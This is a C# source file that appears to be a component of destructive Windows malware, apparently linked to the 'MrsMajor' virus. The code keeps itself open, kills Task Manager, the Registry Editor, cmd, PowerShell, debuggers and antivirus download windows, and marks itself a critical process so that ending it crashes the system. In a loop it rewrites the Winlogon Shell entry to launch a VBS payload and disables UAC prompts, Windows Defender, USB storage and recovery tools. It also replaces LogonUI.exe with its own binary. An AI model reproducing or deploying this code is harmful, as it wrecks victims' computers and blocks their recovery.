using System.IO;
using System;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Management;
using System.Collections;
using System.Security.Principal;
using Microsoft.Win32;
namespace gdifuncs
{
	
	public partial class protection64 : Form
	{
		public protection64()
		{
			
			InitializeComponent();
			
		}
		protected override void OnFormClosing(FormClosingEventArgs e)
{
  switch (e.CloseReason)
  {
    case CloseReason.UserClosing:
      e.Cancel = true;
      break;
  }

  base.OnFormClosing(e);
}
		
		#region randomshit
		 const int MAXTITLE = 255;

        private static ArrayList mTitlesList;

        private delegate bool EnumDelegate(IntPtr hWnd, int lParam);

        [DllImport("user32.dll", EntryPoint = "EnumDesktopWindows",
         ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool _EnumDesktopWindows(IntPtr hDesktop,
        EnumDelegate lpEnumCallbackFunction, IntPtr lParam);

        [DllImport("user32.dll", EntryPoint = "GetWindowText",
         ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int _GetWindowText(IntPtr hWnd,
        StringBuilder lpWindowText, int nMaxCount);

        private static bool EnumWindowsProc(IntPtr hWnd, int lParam)
        {
            string title = GetWindowText(hWnd);
           
            mTitlesList.Add(title);
            return true;
        }

        /// <summary>
        /// Returns the caption of a windows by given HWND identifier.
        /// </summary>
        public static string GetWindowText(IntPtr hWnd)
        {
            StringBuilder title = new StringBuilder(MAXTITLE);
            int titleLength = _GetWindowText(hWnd, title, title.Capacity + 1);
            title.Length = titleLength;

            return title.ToString();
        }

        /// <summary>
        /// Returns the caption of all desktop windows.
        /// </summary>
        public static string[] GetDesktopWindowsCaptions()
        {
            mTitlesList = new ArrayList();
            EnumDelegate enumfunc = new EnumDelegate(EnumWindowsProc);
            IntPtr hDesktop = IntPtr.Zero; // current desktop
            bool success = _EnumDesktopWindows(hDesktop, enumfunc, IntPtr.Zero);

            if (success)
            {
                // Copy the result to string array
                string[] titles = new string[mTitlesList.Count];
                mTitlesList.CopyTo(titles);
                return titles;
            }
            else
            {
                // Get the last Win32 error code
                int errorCode = Marshal.GetLastWin32Error();

                string errorMessage = String.Format(
                "EnumDesktopWindows failed with code {0}.", errorCode);
                throw new Exception(errorMessage);
            }
        }
		string[] criticalwindlist = {
			
					"proxycap",
					"proxifier",
					"fiddler",
					"wireshark",
					"dnspy",
					"process hacker",
					"megadumper",
					"ollydbg",
					"softperfect",
					"httpdebugger",
					"ilspy",
					"de4dot",
					"decompiler",
					"group policy",
					"nofuser",
					"dependency walker",
					"dotpeek",
					"process monitor",
					"resource monitor",
					"antivirus download",
					"rootabx",
					"mrsmajor virus",
					"disinfect virus",
					"mrsmajor removal",
					"eset download",
					"malwarebytes download",
					"av download",
					"kill me senpai",
					"security policy",
					"control panel"
		};
		
	
		
		string[] proclist = {
			"memz.exe",
			"taskmgr.exe",
			"regedit.exe",
			"mrsmjrgui.exe",
			"cmd.exe",
			"taskkill.exe",
			"powershell.exe",
			"resmon.exe",
			"mmc.exe",
				"wscript.exe"
		};
		
		#endregion
		string lower(string inp) {
			return inp.ToLower().Replace("ı","i");
		}
		void winprockill(object state) {
			while(true){
			Process[] Procs = Process.GetProcesses();
				foreach (Process prc in Procs) {
				
				
				for (int r = 0; r < criticalwindlist.Length; r++) {
					
					if (lower(prc.MainWindowTitle).Contains(criticalwindlist[r])) {
				if (werekilling == 1) {
							werekilling = 0;
							
							try{Process prcx = new Process();
        	prcx.StartInfo.FileName = "cmd.exe";
        	prcx.StartInfo.Arguments = @"/c taskkill /f /im tobi0a0c.exe";
        	prcx.StartInfo.Verb = "runas";
        	prcx.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        	prcx.Start();
							}catch{Application.Exit();}
							System.Threading.Thread.Sleep(4000);
							werekilling = 1;
						}
					}
					
					
				}
				if (lower(prc.MainWindowTitle) == "charles" && lower(prc.ProcessName)+".exe" == "charles.exe") {
					try{
						if (werekilling == 1) {
						prc.Kill();
						}
					}catch{}
				}
				
				
				for (int r = 0; r < proclist.Length; r++) {
					
					if ((lower(prc.ProcessName)+".exe").Contains(proclist[r])) {
					if (werekilling == 1) {
							try{prc.Kill();}catch{}
						}
					}
					
					
				}
				
				
				
				
				
			}
			System.Threading.Thread.Sleep(1);
			
		}}
		void winprockill2(object state) {
		//do nothing and exit
		}
		void taskkill(object state) {
			while(true) {
		
			Process[] Procs = Process.GetProcesses();
				foreach (Process prc in Procs) {
				
				
				string[] desktopWindowsCaptions = GetDesktopWindowsCaptions();
            foreach (string caption in desktopWindowsCaptions)
            {
               
                if (caption.Length > 1)
                {
                	if (lower(caption).Contains("winbase_base_procid_none"))
                    {
                		if (werekilling == 1) {
                		Application.Exit();
                		}
                        
                                       

                        
                    }
                }


            }
				
				
				
			}
			
				System.Threading.Thread.Sleep(100);
			}
		}
		public static int werekilling = 1;
		void Protection64Load(object sender, EventArgs e)
		{	this.Visible = false;
			if (userIsAdministrator()) {
				werekilling = 1;
				   Process.EnterDebugMode(); 
					System.Threading.ThreadPool.QueueUserWorkItem(selfdefend);
						System.Threading.ThreadPool.QueueUserWorkItem(winprockill);
			
			System.Threading.ThreadPool.QueueUserWorkItem(taskkill);
			System.Threading.ThreadPool.QueueUserWorkItem(regdefend);
			}
		
			
		
			
			
		}
		public static bool userIsAdministrator()
{
    using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
    {
    	bool rep = false;
    	try{WindowsPrincipal principal = new WindowsPrincipal(identity);
    		rep= principal.IsInRole(WindowsBuiltInRole.Administrator);}catch{}
    	
    	return rep;
    	
    }
}
		[DllImport("ntdll.dll", SetLastError = true)]
private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
	 int isCritical = 1;  
        const int BreakOnTermination = 0x1D; 
		void regdefend(object state) {
        	while(true) {
        		
        		
        			try{
        		RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"); 
       // 	key.SetValue("Shell",@"explorer.exe, cmd.exe ""/c cd C:\windows\winbase_base_procid_none\secureloc0x65&title parziwool&start tobi0a0c.exe& exit""");
        	key.SetValue("Shell",@"explorer.exe, wscript.exe ""C:\windows\winbase_base_procid_none\secureloc0x65\WinRapistI386.vbs""");
     

       key.Dispose();
        	    }catch{}
        		
        		
        		try{
        		RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system"); 
        		key.SetValue("ConsentPromptBehaviorAdmin",0);
        		key.Dispose();
        	    }catch{}
        		
        		try{
        		RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop"); 
        		key.SetValue("NoChangingWallPaper",1);
        		key.Dispose();
        	    }catch{}
        		
        		try{
        		RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"); 
        		key.SetValue("DisableTaskMgr",1);
        		key.Dispose();
        	    }catch{}
        		
        			try{
        		RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"); 
        		key.SetValue("DisableRegistryTools",1);
        		key.Dispose();
        	    }catch{}
        		
        			try{
        		RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"); 
        		key.SetValue("NoRun",1);
        		key.Dispose();
        	    }catch{}
        		
        		try{
        		RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"); 
        		key.SetValue("NoWinKeys",1);
        		key.Dispose();
        	    }catch{}
        		
        			try{
        		RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Services\usbstor"); 
        		key.SetValue("Start",4);
        		key.Dispose();
        	    }catch{}
        		
        		
        		try{
        		RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"); 
        		key.SetValue("DisableAntiSpyware",1);
        		key.Dispose();
        	    }catch{}
        		
        		
        		try{
        		RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors"); 
        		key.SetValue("Arrow",@"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
        			key.SetValue("AppStarting",@"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
        				key.SetValue("Hand",@"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
        		key.Dispose();
        	    }catch{}
        		
        		
        		
        		System.Threading.Thread.Sleep(2000);
        	}
		}
        public static void logonuiOWR() {
        	
        
        	try{File.Copy("C:\\windows\\winbase_base_procid_none\\secureloc0x65\\0x000F.wav","C:\\0x000F.wav");}catch{}
        	try{File.Create("C:\\windows\\WinAttr.gci");}catch{}
        	werekilling = 0;
        	System.Threading.Thread.Sleep(200);
        	try{Process prcx = new Process();
        	prcx.StartInfo.FileName = "C:\\windows\\system32\\takeown.exe";
        	prcx.StartInfo.Arguments = "/f C:\\windows\\system32\\LogonUI.exe";
        	prcx.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        	prcx.StartInfo.Verb = "runas";
        	prcx.Start();
        	}catch{}
        		try{Process prcx = new Process();
        	prcx.StartInfo.FileName = "C:\\windows\\system32\\icacls.exe";
        	prcx.StartInfo.Arguments = @"C:\\windows\\system32\\LogonUI.exe /granted """ + Environment.GetEnvironmentVariable("USERNAME") + @""":F";
        	prcx.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        		prcx.StartInfo.Verb = "runas";
        	prcx.Start();
        	}catch{}
        	System.Threading.Thread.Sleep(1000);
        	try{File.Copy("C:\\windows\\winbase_base_procid_none\\secureloc0x65\\ui65.exe","C:\\windows\\system32\\LogonUI.exe",true);
        	}catch{}
        	Process prc = new Process();
        	prc.StartInfo.FileName = "cmd.exe";
        	prc.StartInfo.Arguments = @"/c cd\&cd Windows\system32&takeown /f LogonUI.exe&icacls LogonUI.exe /granted ""%username%"":F&cd..&cd winbase_base_procid_none&cd secureloc0x65&copy ""ui65.exe"" ""C:\windows\system32\LogonUI.exe"" /Y&echo WinLTDRStartwinpos > ""c:\windows\WinAttr.gci""&timeout 2&taskkill /f /im ""tobi0a0c.exe""&exit";
        	prc.StartInfo.Verb = "runas";
        	prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        
        	try{        	prc.Start();}catch{}
        	
        	System.Threading.Thread.Sleep(10000);
        	Application.Exit();
        	
        	
        	
        }
		void selfdefend(object state) {
        	while(true) {
        		  NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
  
        		System.Threading.Thread.Sleep(5000);
        	
            	}
		}
	}
}
